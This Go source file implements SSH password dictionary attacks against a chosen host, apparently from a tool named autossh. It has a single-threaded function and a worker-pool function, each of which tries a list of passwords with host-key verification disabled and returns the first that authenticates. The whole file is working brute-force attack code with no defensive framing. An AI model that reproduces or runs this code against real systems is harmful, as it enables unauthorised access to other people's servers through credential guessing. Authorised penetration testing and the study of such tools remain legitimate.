package sshatk

import (
	"errors"
	"net"
	"strings"
	"sync"

	"github.com/cfschilham/autossh/pkg/workers"
	"golang.org/x/crypto/ssh"
)

const AUTH_ERR_SUBSTRING = "ssh: handshake failed: ssh: unable to authenticate"

// dial attempts to establish a connection with the passed credentials. A nil
// error will be returned if successful and vice versa.
func dial(addr, port, username, pwd string) error {
	clientConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(pwd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect to remote host.
	conn, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), clientConfig)
	if err != nil {
		return err
	}
	conn.Close()
	return nil
}

// sendAfter sends true to the returned channel after the completion of the passed
// function.
func sendAfter(fn func()) chan bool {
	c := make(chan bool)
	go func(fn func(), c chan bool) {
		fn()
		c <- true
	}(fn, c)
	return c
}

// SSHDictMT performs a multi-threaded dictionary attack with the passed credentials.
func SSHDictMT(addr, port, username string, pwds []string, goroutines int) (string, error) {
	pool, _ := workers.NewPool(goroutines)

	pwdChan, errChan := make(chan string), make(chan error)
	workerWG := &sync.WaitGroup{}
	workerWG.Add(len(pwds))

	task := workers.NewTask(func(params []interface{}) {
		var (
			addr     = params[0].(string)
			port     = params[1].(string)
			username = params[2].(string)
			pwd      = params[3].(string)
			pwdChan  = params[4].(chan string)
			errChan  = params[5].(chan error)
			workerWG = params[6].(*sync.WaitGroup)
		)

		defer workerWG.Done()
		if err := dial(addr, port, username, pwd); err != nil {
			if !strings.Contains(err.Error(), AUTH_ERR_SUBSTRING) {
				errChan <- err
			}
			return
		}
		pwdChan <- pwd
	})

	for _, pwd := range pwds {
		task.SetParams([]interface{}{addr, port, username, pwd, pwdChan, errChan, workerWG})
		pool.QueueTask(*task)
	}

	if err := pool.Start(); err != nil {
		return "", err
	}
	defer pool.Dismiss()

	select {
	case pwd := <-pwdChan:
		return pwd, nil
	case err := <-errChan:
		return "", errors.New("internal/sshatk: failed to connect to host: " + err.Error())
	case <-sendAfter(workerWG.Wait):
		return "", errors.New("internal/sshatk: unable to connect with dictionary")
	}
}

// SSHDictST performs a single-threaded dictionary attack with the passed credentials.
func SSHDictST(addr, port, username string, pwds []string) (string, error) {
	for _, pwd := range pwds {
		if err := dial(addr, port, username, pwd); err != nil {
			if !strings.Contains(err.Error(), AUTH_ERR_SUBSTRING) {
				return "", errors.New("internal/sshatk: failed to connect to host: " + err.Error())
			}
			continue
		}
		return pwd, nil
	}
	return "", errors.New("internal/sshatk: unable to connect with dictionary")
}
